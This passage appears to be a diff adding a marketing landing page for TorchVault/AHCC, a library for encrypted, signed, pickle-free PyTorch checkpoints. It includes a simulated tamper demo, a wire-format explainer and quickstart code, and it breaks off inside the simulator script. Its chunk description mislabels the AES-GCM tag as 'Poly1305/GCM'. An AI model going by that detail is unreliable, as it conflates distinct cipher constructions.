@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AHCC / TorchVault — Secure AI Checkpoint Platform</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            brand: {
+              50: '#f0fdf4',
+              500: '#22c55e',
+              600: '#16a34a',
+              700: '#15803d',
+            },
+            accent: {
+              500: '#8b5cf6',
+              600: '#7c3aed',
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+    code, pre, .mono { font-family: 'JetBrains Mono', monospace; }
+    .glow-green { box-shadow: 0 0 25px -5px rgba(34, 197, 94, 0.35); }
+    .glow-purple { box-shadow: 0 0 25px -5px rgba(139, 92, 246, 0.35); }
+    .glow-red { box-shadow: 0 0 25px -5px rgba(239, 68, 68, 0.35); }
+  </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen antialiased selection:bg-purple-600 selection:text-white">
+
+  <!-- NAVIGATION -->
+  <nav class="border-b border-slate-800/80 bg-slate-950/80 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <div class="h-9 w-9 rounded-lg bg-gradient-to-tr from-purple-600 to-emerald-500 flex items-center justify-center font-bold text-white shadow-md">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+        </div>
+        <span class="font-extrabold text-lg tracking-tight bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">TorchVault / AHCC</span>
+        <span class="px-2 py-0.5 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">v0.7.0</span>
+      </div>
+      <div class="hidden md:flex items-center gap-6 text-sm font-medium text-slate-300">
+        <a href="#features" class="hover:text-white transition">Features</a>
+        <a href="#simulator" class="hover:text-white transition">Interactive Simulator</a>
+        <a href="#architecture" class="hover:text-white transition">Container Wire Format</a>
+        <a href="#quickstart" class="hover:text-white transition">Quickstart</a>
+        <a href="#docs" class="hover:text-white transition">Documentation</a>
+      </div>
+      <div class="flex items-center gap-3">
+        <a href="https://github.com/csharpe/AHCC_GPU_Engine" target="_blank" class="px-3.5 py-1.5 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition flex items-center gap-2">
+          <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+          GitHub
+        </a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- HERO SECTION -->
+  <section class="relative overflow-hidden pt-20 pb-24 border-b border-slate-900 bg-radial-gradient">
+    <div class="absolute inset-0 bg-[radial-gradient(circle_at_30%_30%,rgba(139,92,246,0.12),transparent_50%),radial-gradient(circle_at_70%_60%,rgba(34,197,94,0.08),transparent_50%)] pointer-events-none"></div>
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 text-center relative z-10">
+      
+      <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold bg-purple-500/10 text-purple-300 border border-purple-500/20 mb-6">
+        <span class="inline-block w-2 h-2 rounded-full bg-purple-400 animate-pulse"></span>
+        Zero Pickle RCE Exploits &bull; Streaming AEAD AES-256-GCM &bull; Ed25519 Signatures
+      </div>
+
+      <h1 class="text-4xl sm:text-6xl font-extrabold tracking-tight text-white mb-6 leading-tight">
+        Cryptographically Hardened <br/>
+        <span class="bg-gradient-to-r from-purple-400 via-emerald-400 to-teal-300 bg-clip-text text-transparent">AI Model & Training Checkpoints</span>
+      </h1>
+
+      <p class="max-w-3xl mx-auto text-lg text-slate-300 mb-10 leading-relaxed font-light">
+        A high-performance security platform for PyTorch and Hugging Face. Eliminates arbitrary code execution vulnerabilities during checkpoint loading, prevents weight tampering, enforces monotonic counter nonces with zero collision risk, and guarantees bit-for-bit training recovery.
+      </p>
+
+      <div class="flex flex-wrap items-center justify-center gap-4 mb-14">
+        <a href="#simulator" class="px-6 py-3.5 rounded-xl font-semibold bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white shadow-lg glow-purple transition transform hover:-translate-y-0.5 flex items-center gap-2">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+          Launch Interactive Tamper Simulator
+        </a>
+        <a href="#quickstart" class="px-6 py-3.5 rounded-xl font-semibold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition">
+          View Quickstart Code
+        </a>
+      </div>
+
+      <!-- Hero Metrics Row -->
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto text-left">
+        <div class="p-4 rounded-xl bg-slate-900/60 border border-slate-800">
+          <div class="text-2xl font-extrabold text-emerald-400 mono">0 Collisions</div>
+          <div class="text-xs text-slate-400 mt-1">Deterministic sequential nonces (b"CHNK" + uint64_be)</div>
+        </div>
+        <div class="p-4 rounded-xl bg-slate-900/60 border border-slate-800">
+          <div class="text-2xl font-extrabold text-purple-400 mono">Zero Pickle</div>
+          <div class="text-xs text-slate-400 mt-1">Direct binary buffers & canonical RFC 8785 JSON</div>
+        </div>
+        <div class="p-4 rounded-xl bg-slate-900/60 border border-slate-800">
+          <div class="text-2xl font-extrabold text-teal-400 mono">100% Bit-Exact</div>
+          <div class="text-xs text-slate-400 mt-1">Exact weights, AdamW/SGD momentum, & RNG state recovery</div>
+        </div>
+        <div class="p-4 rounded-xl bg-slate-900/60 border border-slate-800">
+          <div class="text-2xl font-extrabold text-indigo-400 mono">AWS KMS</div>
+          <div class="text-xs text-slate-400 mt-1">Envelope encryption with rotation hooks & cloud HSMs</div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- INTERACTIVE SIMULATOR SECTION -->
+  <section id="simulator" class="py-20 border-b border-slate-900 bg-slate-950">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+      
+      <div class="text-center mb-12">
+        <h2 class="text-3xl font-extrabold text-white mb-3">Interactive Cryptographic Simulator</h2>
+        <p class="text-slate-400 max-w-2xl mx-auto text-sm">
+          Experience how TorchVault fails closed against adversarial tampering, memory bombs, and supply chain deserialization exploits in real time.
+        </p>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+        
+        <!-- Controls Column -->
+        <div class="lg:col-span-5 space-y-4">
+          <div class="p-5 rounded-2xl bg-slate-900 border border-slate-800 shadow-xl">
+            <h3 class="text-sm font-bold uppercase tracking-wider text-slate-400 mb-4 flex items-center gap-2">
+              <svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4"/></svg>
+              Select Adversary Attack Scenario
+            </h3>
+
+            <div class="space-y-2">
+              <button onclick="runScenario('clean')" id="btn-clean" class="w-full text-left p-3.5 rounded-xl border border-emerald-500/40 bg-emerald-500/10 hover:bg-emerald-500/20 text-white font-medium text-sm transition flex items-center justify-between">
+                <div>
+                  <div class="font-semibold text-emerald-400">1. Normal Authenticated Load</div>
+                  <div class="text-xs text-slate-300">Valid key, unaltered chunks, verified Ed25519 signature</div>
+                </div>
+                <span class="text-xs px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono">PASS</span>
+              </button>
+
+              <button onclick="runScenario('tamper_weight')" id="btn-tamper_weight" class="w-full text-left p-3.5 rounded-xl border border-slate-800 bg-slate-950/60 hover:bg-slate-800/60 text-slate-300 font-medium text-sm transition flex items-center justify-between">
+                <div>
+                  <div class="font-semibold text-white">2. Flip 1 Single Weight Bit</div>
+                  <div class="text-xs text-slate-400">Adversary modifies a weight tensor in Chunk #1</div>
+                </div>
+                <span class="text-xs px-2 py-0.5 rounded bg-red-500/20 text-red-300 font-mono">AEAD FAIL</span>
+              </button>
+
+              <button onclick="runScenario('reorder')" id="btn-reorder" class="w-full text-left p-3.5 rounded-xl border border-slate-800 bg-slate-950/60 hover:bg-slate-800/60 text-slate-300 font-medium text-sm transition flex items-center justify-between">
+                <div>
+                  <div class="font-semibold text-white">3. Swap Chunk Ordering</div>
+                  <div class="text-xs text-slate-400">Adversary swaps Layer 1 and Layer 2 chunk sequence</div>
+                </div>
+                <span class="text-xs px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 font-mono">AAD FAIL</span>
+              </button>
+
+              <button onclick="runScenario('pickle_exploit')" id="btn-pickle_exploit" class="w-full text-left p-3.5 rounded-xl border border-slate-800 bg-slate-950/60 hover:bg-slate-800/60 text-slate-300 font-medium text-sm transition flex items-center justify-between">
+                <div>
+                  <div class="font-semibold text-white">4. Poisoned Pickle RCE Attempt</div>
+                  <div class="text-xs text-slate-400">Attacker attempts to inject executable __reduce__ bytecode</div>
+                </div>
+                <span class="text-xs px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono">BLOCKED</span>
+              </button>
+
+              <button onclick="runScenario('rollback')" id="btn-rollback" class="w-full text-left p-3.5 rounded-xl border border-slate-800 bg-slate-950/60 hover:bg-slate-800/60 text-slate-300 font-medium text-sm transition flex items-center justify-between">
+                <div>
+                  <div class="font-semibold text-white">5. Rollback to Stale Checkpoint</div>
+                  <div class="text-xs text-slate-400">Replaying Step 100 after Step 500 completed</div>
+                </div>
+                <span class="text-xs px-2 py-0.5 rounded bg-red-500/20 text-red-300 font-mono">REJECTED</span>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Terminal & Visualizer Column -->
+        <div class="lg:col-span-7">
+          <div class="rounded-2xl bg-slate-900 border border-slate-800 overflow-hidden shadow-2xl flex flex-col h-[520px]">
+            
+            <!-- Terminal Header -->
+            <div class="px-4 py-3 bg-slate-950 border-b border-slate-800 flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="w-3 h-3 rounded-full bg-red-500/80 inline-block"></span>
+                <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block"></span>
+                <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block"></span>
+                <span class="ml-2 text-xs font-mono text-slate-400" id="terminal-title">runtime_verification_console</span>
+              </div>
+              <span class="text-[11px] font-mono text-slate-500">AES-256-GCM / SHA-256 / Ed25519</span>
+            </div>
+
+            <!-- Terminal Body -->
+            <div class="p-5 font-mono text-xs overflow-y-auto flex-1 space-y-2 leading-relaxed" id="terminal-logs">
+              <!-- Logs populated via JS -->
+            </div>
+
+            <!-- Verification Status Bar -->
+            <div class="p-4 bg-slate-950/90 border-t border-slate-800 flex items-center justify-between" id="status-bar">
+              <!-- Status populated via JS -->
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- CONTAINER WIRE FORMAT EXPLORER -->
+  <section id="architecture" class="py-20 border-b border-slate-900 bg-slate-900/30">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+      
+      <div class="text-center mb-14">
+        <h2 class="text-3xl font-extrabold text-white mb-3">Container Wire Format Specification (v5)</h2>
+        <p class="text-slate-400 max-w-2xl mx-auto text-sm">
+          Click any section of the encrypted container layout to view byte layouts, cryptographic bounds, and tamper protection mechanisms.
+        </p>
+      </div>
+
+      <!-- Interactive Layout Cards -->
+      <div class="space-y-4">
+        
+        <!-- Header -->
+        <div onclick="selectSection('header')" id="sec-header" class="cursor-pointer p-4 rounded-xl border border-purple-500/40 bg-purple-500/10 hover:border-purple-400 transition">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-3">
+              <span class="px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono text-xs font-semibold">0x00 - 0x28 (40 Bytes)</span>
+              <span class="font-bold text-white text-sm">Container Public Envelope</span>
+            </div>
+            <span class="text-xs text-purple-300 font-mono">Magic: "AHCC\x00CK5" | Version: 0x05 | Salt: 32B</span>
+          </div>
+          <div class="text-xs text-slate-400 mt-2" id="desc-header">
+            Unencrypted outer header. The 32-byte salt is an RFC 5869 public extraction parameter for HKDF-SHA256 domain-separated subkey generation.
+          </div>
+        </div>
+
+        <!-- Chunks -->
+        <div onclick="selectSection('chunks')" id="sec-chunks" class="cursor-pointer p-4 rounded-xl border border-slate-800 bg-slate-900 hover:border-slate-700 transition">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-3">
+              <span class="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono text-xs font-semibold">0x29 - Offset (Variable)</span>
+              <span class="font-bold text-white text-sm">Streaming Chunk Envelopes (1..M)</span>
+            </div>
+            <span class="text-xs text-emerald-300 font-mono">AES-256-GCM / Counter Nonce</span>
+          </div>
+          <div class="text-xs text-slate-400 mt-2" id="desc-chunks">
+            Tensors are partitioned into 4 MiB streaming chunks. Each chunk contains a 12-byte counter nonce (<code>b"CHNK" + uint64_be</code>), encrypted tensor payload, and a 16-byte Poly1305/GCM authentication tag. Zero collision risk.
+          </div>
+        </div>
+
+        <!-- Manifest -->
+        <div onclick="selectSection('manifest')" id="sec-manifest" class="cursor-pointer p-4 rounded-xl border border-slate-800 bg-slate-900 hover:border-slate-700 transition">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-3">
+              <span class="px-2 py-0.5 rounded bg-indigo-500/20 text-indigo-300 font-mono text-xs font-semibold">Trailer Envelope</span>
+              <span class="font-bold text-white text-sm">Canonical Manifest & Ed25519 Signature</span>
+            </div>
+            <span class="text-xs text-indigo-300 font-mono">RFC 8785 JSON | Ed25519 (64B)</span>
+          </div>
+          <div class="text-xs text-slate-400 mt-2" id="desc-manifest">
+            Encrypted canonical JSON cataloging tensor shapes, dtypes, AdamW momentum, RNG states, and training progress. Digitally signed with an Ed25519 publisher key, transitively binding every weight in the model.
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- QUICKSTART CODE SECTION -->
+  <section id="quickstart" class="py-20 border-b border-slate-900 bg-slate-950">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+      
+      <div class="text-center mb-12">
+        <h2 class="text-3xl font-extrabold text-white mb-3">Drop-in Integration in Minutes</h2>
+        <p class="text-slate-400 max-w-2xl mx-auto text-sm">
+          Seamlessly integrates with vanilla PyTorch training loops and Hugging Face Trainer with zero code architectural changes.
+        </p>
+      </div>
+
+      <!-- Tabs -->
+      <div class="flex justify-center mb-6">
+        <div class="inline-flex rounded-xl bg-slate-900 p-1 border border-slate-800">
+          <button onclick="switchTab('pytorch')" id="tab-btn-pytorch" class="px-5 py-2 rounded-lg text-xs font-bold bg-purple-600 text-white transition">
+            PyTorch Training Loop
+          </button>
+          <button onclick="switchTab('hf')" id="tab-btn-hf" class="px-5 py-2 rounded-lg text-xs font-bold text-slate-400 hover:text-white transition">
+            Hugging Face Trainer
+          </button>
+          <button onclick="switchTab('cli')" id="tab-btn-cli" class="px-5 py-2 rounded-lg text-xs font-bold text-slate-400 hover:text-white transition">
+            CLI Inspection & Audit
+          </button>
+        </div>
+      </div>
+
+      <!-- Code Windows -->
+      <div class="max-w-4xl mx-auto">
+        
+        <!-- PyTorch Code -->
+        <div id="tab-pytorch" class="rounded-2xl bg-slate-900 border border-slate-800 overflow-hidden shadow-xl">
+          <div class="px-4 py-3 bg-slate-950 border-b border-slate-800 flex items-center justify-between text-xs text-slate-400 font-mono">
+            <span>train_secure_checkpoint.py</span>
+            <button onclick="copyCode('code-pytorch')" class="hover:text-white text-slate-400 flex items-center gap-1 text-xs">
+              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+              Copy
+            </button>
+          </div>
+          <pre class="p-5 text-xs text-slate-200 overflow-x-auto leading-relaxed" id="code-pytorch"><code>import secrets
+import torch
+from ahcc import save_training_checkpoint, load_training_checkpoint, TrainingProgress
+
+# 1. 256-bit symmetric key (or AWS KMS provider)
+key = secrets.token_bytes(32)
+
+# 2. Save complete state (model weights, AdamW momentum, learning rate, & RNG)
+save_training_checkpoint(
+    output_path="checkpoints/epoch_10.ahcc",
+    key=key,
+    model=model,
+    optimizer=optimizer,
+    progress=TrainingProgress(epoch=10, global_step=5000, loss=0.1425),
+)
+
+# 3. Resume in a fresh process with exact mathematical bitwise equivalence
+progress = load_training_checkpoint(
+    input_path="checkpoints/epoch_10.ahcc",
+    key=key,
+    model=fresh_model,
+    optimizer=fresh_optimizer,
+    device="cuda",
+)
+print(f"Resumed at step {progress.global_step}")</code></pre>
+        </div>
+
+        <!-- Hugging Face Code -->
+        <div id="tab-hf" class="hidden rounded-2xl bg-slate-900 border border-slate-800 overflow-hidden shadow-xl">
+          <div class="px-4 py-3 bg-slate-950 border-b border-slate-800 flex items-center justify-between text-xs text-slate-400 font-mono">
+            <span>huggingface_secure_trainer.py</span>
+            <button onclick="copyCode('code-hf')" class="hover:text-white text-slate-400 flex items-center gap-1 text-xs">
+              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+              Copy
+            </button>
+          </div>
+          <pre class="p-5 text-xs text-slate-200 overflow-x-auto leading-relaxed" id="code-hf"><code>import secrets
+from transformers import Trainer, TrainingArguments
+from ahcc import TorchVaultTrainerCallback
+
+key = secrets.token_bytes(32)
+
+# Attach callback to automatically save encrypted, pickle-free checkpoints
+callback = TorchVaultTrainerCallback(
+    key=key,
+    vault_filename="torchvault_checkpoint.ahcc",
+    remove_insecure_pickle=True,  # Purges unsafe optimizer.pt, scheduler.pt, rng_state.pth
+)
+
+trainer = Trainer(
+    model=model,
+    args=TrainingArguments(output_dir="./secure_ckpts", save_steps=500),
+    train_dataset=train_dataset,
+    callbacks=[callback],
+)
+trainer.train()</code></pre>
+        </div>
+
+        <!-- CLI Code -->
+        <div id="tab-cli" class="hidden rounded-2xl bg-slate-900 border border-slate-800 overflow-hidden shadow-xl">
+          <div class="px-4 py-3 bg-slate-950 border-b border-slate-800 flex items-center justify-between text-xs text-slate-400 font-mono">
+            <span>bash / powershell</span>
+            <button onclick="copyCode('code-cli')" class="hover:text-white text-slate-400 flex items-center gap-1 text-xs">
+              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+              Copy
+            </button>
+          </div>
+          <pre class="p-5 text-xs text-slate-200 overflow-x-auto leading-relaxed" id="code-cli"><code># Inspect public outer container (no secret key required)
+ahcc info checkpoints/epoch_10.ahcc
+
+# Inspect full manifest metadata (training progress & tensor inventory)
+ahcc inspect checkpoints/epoch_10.ahcc --key-hex 0123456789abcdef...
+
+# Verify Ed25519 digital publisher signature
+ahcc verify checkpoints/signed_model.ahcc --public-key <PUBKEY_HEX></code></pre>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- DOCUMENTATION DIRECTORY -->
+  <section id="docs" class="py-20 border-b border-slate-900 bg-slate-900/40">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+      
+      <div class="text-center mb-12">
+        <h2 class="text-3xl font-extrabold text-white mb-3">Complete Engineering Documentation</h2>
+        <p class="text-slate-400 max-w-2xl mx-auto text-sm">
+          Deep architectural specifications, threat modeling, and operational boundaries.
+        </p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+        
+        <a href="INSTALLATION.md" class="p-5 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/50 hover:bg-slate-800/50 transition group">
+          <div class="font-bold text-white group-hover:text-purple-400 transition flex items-center justify-between">
+            <span>Installation Guide</span>
+            <svg class="w-4 h-4 text-slate-500 group-hover:text-purple-400 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+          </div>
+          <div class="text-xs text-slate-400 mt-2">Standalone wheel, source distribution, CUDA & CPU setup.</div>
+        </a>
+
+        <a href="USAGE.md" class="p-5 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/50 hover:bg-slate-800/50 transition group">
+          <div class="font-bold text-white group-hover:text-purple-400 transition flex items-center justify-between">
+            <span>Usage & API Guide</span>
+            <svg class="w-4 h-4 text-slate-500 group-hover:text-purple-400 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+          </div>
+          <div class="text-xs text-slate-400 mt-2">Training checkpoint recipes, metadata inspection, and CLI.</div>
+        </a>
+
+        <a href="HUGGINGFACE_INTEGRATION.md" class="p-5 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/50 hover:bg-slate-800/50 transition group">
+          <div class="font-bold text-white group-hover:text-purple-400 transition flex items-center justify-between">
+            <span>Hugging Face Integration</span>
+            <svg class="w-4 h-4 text-slate-500 group-hover:text-purple-400 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+          </div>
+          <div class="text-xs text-slate-400 mt-2">TorchVaultTrainerCallback, Trainer subclass, and pickle purging.</div>
+        </a>
+
+        <a href="THREAT_MODEL.md" class="p-5 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/50 hover:bg-slate-800/50 transition group">
+          <div class="font-bold text-white group-hover:text-purple-400 transition flex items-center justify-between">
+            <span>Threat Model</span>
+            <svg class="w-4 h-4 text-slate-500 group-hover:text-purple-400 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+          </div>
+          <div class="text-xs text-slate-400 mt-2">Formal adversary capabilities, trust boundaries, and defense limits.</div>
+        </a>
+
+        <a href="TRAINING_CHECKPOINT_SCHEMA.md" class="p-5 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/50 hover:bg-slate-800/50 transition group">
+          <div class="font-bold text-white group-hover:text-purple-400 transition flex items-center justify-between">
+            <span>Checkpoint Schema (v5)</span>
+            <svg class="w-4 h-4 text-slate-500 group-hover:text-purple-400 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+          </div>
+          <div class="text-xs text-slate-400 mt-2">Byte-level layout, AAD serialization, and nonces.</div>
+        </a>
+
+        <a href="KMS_INTEGRATION.md" class="p-5 rounded-xl bg-slate-900 border border-slate-800 hover:border-purple-500/50 hover:bg-slate-800/50 transition group">
+          <div class="font-bold text-white group-hover:text-purple-400 transition flex items-center justify-between">
+            <span>KMS Key Management</span>
+            <svg class="w-4 h-4 text-slate-500 group-hover:text-purple-400 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+          </div>
+          <div class="text-xs text-slate-400 mt-2">Envelope encryption with AWS KMS, local keys, and rotation.</div>
+        </a>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="py-10 border-t border-slate-900 bg-slate-950 text-slate-500 text-xs text-center">
+    <div class="max-w-6xl mx-auto px-4">
+      <p class="mb-2">TorchVault / AHCC &bull; Authenticated, Pickle-Free AI Checkpoint Platform</p>
+      <p class="text-slate-600">Built for high-consequence PyTorch and Hugging Face deep learning workflows.</p>
+    </div>
+  </footer>
+
+  <!-- JAVASCRIPT FOR SIMULATOR & TABS -->
+  <script>
+    const scenarios = {
+      clean: {
+        title: "SCENARIO 1: NORMAL AUTHENTICATED LOAD",
+        badge: "VERIFIED VALID",
+        badgeClass: "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30",
+        logs: [
+          "[INFO] Loading container 'checkpoints/model_step5000.ahcc'...",
+          "[VERIFY] Container Header: Magic='AHCC\\x00CK5', Version=5",
+          "[KDF] Extracting PRK using 32-byte public header salt...",
+          "[KDF] HKDF-Expand -> Derived Manifest Subkey & Chunk Subkey",
+          "[AEAD] Decrypting Manifest Envelope (b'MANI' || Nonce Counter=0)... [OK]",
+          "[SIG] Verifying Ed25519 Publisher Signature against Canonical Manifest... [VALID]",
+          "[STREAM] Streaming Chunk #0 (Size: 4.19 MB, Nonce: b'CHNK\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00')... [TAG VALID]",
+          "[STREAM] Streaming Chunk #1 (Size: 3.82 MB, Nonce: b'CHNK\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01')... [TAG VALID]",
+          "[STATE] Restoring model weights into GPU VRAM (device='cuda:0')...",
+          "[STATE] Restoring AdamW first & second momentum tensors...",
+          "[RNG] Restoring Python, NumPy, PyTorch CPU, & PyTorch CUDA RNG generators...",
+          "[SUCCESS] Checkpoint loaded bit-for-bit with exact mathematical equivalence! Ready to step."
+        ]
+      },
+      tamper_weight: {
+        title: "SCENARIO 2: TAMPERED WEIGHT BYTE (BIT FLIP)",
+        badge: "AUTHENTICATION FAILED",
+        badgeClass: "bg-red-500/20 text-red-400 border border-red-500/30",
+        logs: [
+          "[INFO] Loading container 'checkpoints/model_step5000.ahcc'...",
+          "[VERIFY] Container Header: Magic='AHCC\\x00CK5', Version=5",
+          "[KDF] Extracting PRK using 32-byte public header salt...",
+          "[KDF] HKDF-Expand -> Derived Manifest Subkey & Chunk Subkey",
+          "[AEAD] Decrypting Manifest Envelope (b'MANI' || Nonce Counter=0)... [OK]",
+          "[SIG] Verifying Ed25519 Publisher Signature against Canonical Manifest... [VALID]",
+          "[STREAM] Streaming Chunk #0... [TAG VALID]",
+          "[STREAM] Streaming Chunk #1 (Size: 3.82 MB)...",
+          "[SECURITY ALERT] GCM 128-bit Authentication Tag Mismatch in Chunk #1!",
+          "[SECURITY ALERT] Weight parameter 'layer_3.attention.wq.weight' corrupted or maliciously modified!",
+          "[FAIL CLOSED] Aborting memory allocation. All decrypted staging buffers scrubbed with zeros.",
+          "AuthenticationError: Checkpoint chunk #1 authentication failed. Possible tampering or disk bit-rot."
+        ]
+      },
+      reorder: {
+        title: "SCENARIO 3: SPLICED / REORDERED CHUNKS",
+        badge: "AAD INTEGRITY FAILED",
+        badgeClass: "bg-amber-500/20 text-amber-400 border border-amber-500/30",
+        logs: [
+          "[INFO] Loading container 'checkpoints/model_step5000.ahcc'...",
+          "[VERIFY] Container Header: Magic='AHCC\\x00CK5', Version=5",
+          "[AEAD] Decrypting Manifest Envelope... [OK]",
+          "[STREAM] Reading Chunk Envelope at offset 0x4800...",
+          "[SECURITY ALERT] Associated Authenticated Data (AAD) Sequence Mismatch!",
+          "[EXPECTED AAD] artifact_id='run_01' || chunk_index=0 || total_chunks=2",
